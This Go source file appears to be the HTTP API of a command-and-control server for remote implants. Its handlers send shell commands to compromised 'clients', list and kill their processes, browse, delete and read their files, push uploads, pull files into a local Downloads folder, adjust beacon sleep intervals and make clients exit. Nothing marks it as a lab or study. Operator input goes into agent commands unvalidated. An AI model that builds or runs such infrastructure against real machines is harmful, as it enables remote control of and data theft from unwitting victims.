package api

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils"
	"context"
	"encoding/binary"
	"io"
	"net/http"
	"os"

	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

func GetClients(c *gin.Context) {
	var clientGet struct {
		Page     int `form:"page"`
		PageSize int `form:"page_size"`
	}
	if err := c.ShouldBindQuery(&clientGet); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	var clientData []database.Clients
	database.Engine.Find(&clientData)
	clientData2 := utils.Paginate(clientData, clientGet.Page, clientGet.PageSize)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": gin.H{
		"list":  clientData2,
		"total": len(clientData),
	}})
}
func SendCommands(c *gin.Context) {
	var commands struct {
		Uid     string `form:"uid"`
		Command string `json:"command"`
	}
	if err := c.ShouldBindJSON(&commands); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}

	var shellHistory database.Shell
	database.Engine.Where("uid = ?", commands.Uid).Get(&shellHistory)
	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + commands.Command + "\n"
	database.Engine.Where("uid = ?", commands.Uid).Update(&shellHistory)

	sendcommand.SendCommand(commands.Uid, commands.Command)

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": shellHistory.ShellContent})
}

func GetShellContent(c *gin.Context) {
	var shellContent struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&shellContent); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	var shell database.Shell
	database.Engine.Where("uid = ?", shellContent.Uid).Get(&shell)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": shell.ShellContent})
	//var body struct {
	//	Uid string `form:"uid"`
	//}
	//
	//if err := c.ShouldBindQuery(&body); err != nil {
	//	c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	//}
	//fmt.Println(body.Uid)
	//var shell database.Shell
	//database.Engine.Where("uid = ?", body.Uid).Get(&shell)
	//c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": shell.ShellContent})
}
func GetPidList(c *gin.Context) {
	var shellContent struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&shellContent); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	// 创建 UID 对应的通道队列
	queue := command.VarPidQueue.GetOrCreateQueue(shellContent.Uid)

	sendcommand.SendCommand(shellContent.Uid, "ps")

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case pids := <-queue:
		pidStruct := utils.ParsePid(pids)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": pidStruct})
	case <-ctx.Done():
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
	}
}
func KillPid(c *gin.Context) {
	var pidBody struct {
		Uid string `json:"uid"`
		Pid string `json:"pid"`
	}
	if err := c.ShouldBindJSON(&pidBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	sendcommand.SendCommand(pidBody.Uid, "kill "+pidBody.Pid)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": "killed"})
}
func FileBrowse(c *gin.Context) {
	var fileBody struct {
		Uid     string `json:"uid"`
		DirPath string `json:"dirPath"`
	}
	if err := c.ShouldBindJSON(&fileBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	if fileBody.DirPath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "dirPath is empty"})
	}

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)
	if strings.HasSuffix(fileBody.DirPath, ":") {
		fileBody.DirPath += "/"
	}
	//fmt.Println("dirPath:", fileBody.DirPath)
	sendcommand.SendCommand(fileBody.Uid, "filebrowse "+fileBody.DirPath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
	case <-ctx.Done():
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
	}

}
func FileDelete(c *gin.Context) {
	var fileBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
	}
	if err := c.ShouldBindJSON(&fileBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	sendcommand.SendCommand(fileBody.Uid, "rm "+fileBody.FilePath)

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)

	var dirPath string
	lastSlashIndex := strings.LastIndex(fileBody.FilePath, "/")
	if lastSlashIndex != -1 {
		dirPath = fileBody.FilePath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(fileBody.Uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
	case <-ctx.Done():
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
	}
}
func MakeDir(c *gin.Context) {
	var dirBody struct {
		Uid     string `json:"uid"`
		DirPath string `json:"dirPath"`
	}
	if err := c.ShouldBindJSON(&dirBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	sendcommand.SendCommand(dirBody.Uid, "mkdir "+dirBody.DirPath)

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(dirBody.Uid)

	var dirPath string
	lastSlashIndex := strings.LastIndex(dirBody.DirPath, "/")
	if lastSlashIndex != -1 {
		dirPath = dirBody.DirPath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(dirBody.Uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(dirBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
	case <-ctx.Done():
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
	}
}
func FileUpload(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "No file uploaded"})
		return
	}
	// 打开上传的文件
	src, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Unable to open file"})
		return
	}
	defer src.Close()

	// 读取文件内容到字节数组
	fileBytes, err := io.ReadAll(src)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Unable to read file"})
		return
	}

	// 获取其他表单字段
	uid := c.PostForm("uid")
	uploadPath := c.PostForm("uploadPath")

	uploadPathBytes := []byte(uploadPath)
	uploadPathLen := len(uploadPathBytes)
	uploadPathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(uploadPathLenBytes, uint32(uploadPathLen))
	fileBytesArray := utils.SplitByteArray(fileBytes, 1040500)
	go func() {
		if len(fileBytesArray) == 0 {
			return
		}
		cmd := utils.BytesCombine(uploadPathLenBytes, uploadPathBytes, fileBytesArray[0])
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.UploadStart))
		byteToSend := append(cmdTypeBytes, cmd...)
		sendcommand.SendFileUploadCommand(uid, byteToSend)

		for _, filebytes := range fileBytesArray[1:] {
			cmdLoop := utils.BytesCombine(uploadPathLenBytes, uploadPathBytes, filebytes)
			cmdTypeBytesLoop := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytesLoop, uint32(command.UploadLoop))
			byteToSendLoop := append(cmdTypeBytesLoop, cmdLoop...)
			sendcommand.SendFileUploadCommand(uid, byteToSendLoop)
		}
	}()
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}
func GetNote(c *gin.Context) {
	var noteBody struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&noteBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	var Note database.Notes
	database.Engine.Where("uid = ?", noteBody.Uid).Get(&Note)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": Note.Note})
}
func SaveNote(c *gin.Context) {
	var noteBody struct {
		Uid         string `json:"uid"`
		NoteContent string `json:"noteContent"`
	}
	if err := c.ShouldBindJSON(&noteBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	var Note database.Notes
	database.Engine.Where("uid = ?", noteBody.Uid).Get(&Note)
	Note.Note = noteBody.NoteContent
	database.Engine.Where("uid = ?", noteBody.Uid).Update(&Note)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}
func DownloadFile(c *gin.Context) {
	var fileBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
	}
	if err := c.ShouldBindJSON(&fileBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}

	_, err := os.Stat("./Downloads/" + fileBody.Uid)
	if os.IsNotExist(err) {
		// 文件夹不存在，创建文件夹
		err = os.MkdirAll("./Downloads/"+fileBody.Uid, os.ModePerm)
	}

	var fileDownloads database.Downloads
	exist, _ := database.Engine.Where("uid = ? AND file_path = ?", fileBody.Uid, fileBody.FilePath).Get(&fileDownloads)
	if !exist {
		database.Engine.Insert(&database.Downloads{Uid: fileBody.Uid, FileName: filepath.Base(fileBody.FilePath), FilePath: fileBody.FilePath, FileSize: 0, DownloadedSize: 0})
	} else {
		sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
		database.Engine.QueryString(sql, 0, 0, fileBody.Uid, fileBody.FilePath)
	}
	sendcommand.SendCommand(fileBody.Uid, "download "+fileBody.FilePath)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

type DownloadsInfo struct {
	FileName       string `json:"fileName"`
	FilePath       string `json:"filePath"`
	FileSize       string `json:"fileSize"`
	DownloadedPart string `json:"downloadPart"`
}

func GetDownloadsInfo(c *gin.Context) {
	var downloadBody struct {
		Uid string `form:"uid"`
	}
	if err := c.BindQuery(&downloadBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	var downloads []database.Downloads
	database.Engine.Where("uid = ?", downloadBody.Uid).Find(&downloads)
	var result []DownloadsInfo
	for _, download := range downloads {
		var tmpDownloadsInfo DownloadsInfo
		tmpDownloadsInfo.FileName = download.FileName
		tmpDownloadsInfo.FilePath = download.FilePath
		tmpDownloadsInfo.FileSize = utils.BytesToSize(strconv.Itoa(download.FileSize))
		if download.FileSize != 0 {
			tmpDownloadsInfo.DownloadedPart = strconv.Itoa(download.DownloadedSize * 100 / download.FileSize)
		} else {
			tmpDownloadsInfo.DownloadedPart = "0"
		}

		result = append(result, tmpDownloadsInfo)
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": result})
}
func DownloadDownloadedFile(c *gin.Context) {
	var downloadBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
	}
	if err := c.BindJSON(&downloadBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	// 指定文件的完整路径
	fileph := filepath.Join("./Downloads", downloadBody.Uid, filepath.Base(downloadBody.FilePath))

	// 读取文件并设置响应头
	c.Header("Content-Description", "File Transfer")
	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", "attachment; filename="+filepath.Base(downloadBody.FilePath))
	c.Header("Content-Type", "application/octet-stream")

	// 发送文件
	c.File(fileph)
}
func ListDrives(c *gin.Context) {
	var drivesBody struct {
		Uid string `form:"uid"`
	}
	if err := c.BindQuery(&drivesBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}

	queue := command.VarDrivesQueue.GetOrCreateQueue(drivesBody.Uid)

	sendcommand.SendCommand(drivesBody.Uid, "drives")

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		//fmt.Println("fileBrowseStr", fileBrowseStr)
		fileTree := command.ParseDrives(drivesBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
	case <-ctx.Done():
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
	}
}
func FetchFileContent(c *gin.Context) {
	var contentBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"path"`
	}
	if err := c.BindJSON(&contentBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}

	queue := command.VarFileContentQueue.GetOrCreateQueue(contentBody.Uid, contentBody.FilePath)

	sendcommand.SendCommand(contentBody.Uid, "filecontent "+contentBody.FilePath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileContent := <-queue:
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "content": fileContent})
	case <-ctx.Done():
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
	}

}
func ExitClient(c *gin.Context) {
	var clientBody struct {
		Uid string `form:"uid"`
	}
	if err := c.BindQuery(&clientBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	sendcommand.SendCommand(clientBody.Uid, "exit")

	go func() {
		var client database.Clients
		database.Engine.Where("uid = ?", clientBody.Uid).Get(&client)
		duration, _ := time.ParseDuration(client.Sleep + "s")
		time.Sleep(duration)
		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Clients))
		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Downloads))
		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Notes))
		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Shell))
		delete(command.UidFileBrowser, clientBody.Uid)
	}()

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}
func AddUidNote(c *gin.Context) {
	var noteBody struct {
		Uid  string `json:"uid"`
		Note string `json:"note"`
	}
	if err := c.BindJSON(&noteBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}

	database.Engine.Where("uid = ?", noteBody.Uid).Update(&database.Clients{Note: noteBody.Note})
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}
func EditSleep(c *gin.Context) {
	var sleepBody struct {
		Uid   string `json:"uid"`
		Sleep string `json:"sleep"`
	}
	if err := c.BindJSON(&sleepBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	database.Engine.Where("uid = ?", sleepBody.Uid).Update(&database.Clients{Sleep: sleepBody.Sleep})
	sendcommand.SendCommand(sleepBody.Uid, "sleep "+sleepBody.Sleep)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}
func EditColor(c *gin.Context) {
	var colorBody struct {
		Uid   string `json:"uid"`
		Color string `json:"color"`
	}
	if err := c.BindJSON(&colorBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	database.Engine.Where("uid = ?", colorBody.Uid).Update(&database.Clients{Color: colorBody.Color})
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}
